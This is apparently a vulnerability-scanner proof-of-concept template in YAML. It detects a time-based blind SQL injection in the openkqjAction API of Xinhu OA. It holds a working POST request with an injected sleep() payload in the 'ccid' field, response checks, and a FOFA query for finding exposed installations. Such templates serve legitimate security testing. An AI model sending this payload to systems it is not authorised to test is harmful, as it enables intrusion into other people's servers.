id: poc-yaml-rockoa-openkqjaction-sqli
info:
  name: 信呼OA openkqjAction SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: xinhu
  fofa: app="信呼-OA系统"
variables:
  t1: random_int(2,5)
  t2: t1 + t1
  t3: t2 + 2
requests:
- method: POST
  path: /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: '{"a":{"data":"fingerprint","ccid":"1'' or sleep({{.t1}})#''","fingerprint":"3"}}'
  expression: status_code == 200 && contains(body,"kqjcmdModel.php") && contains(body,"Undefined
    index") && contains(body,"\"info\":\"ok\"") && duration > t2 && duration < t3
transport: http
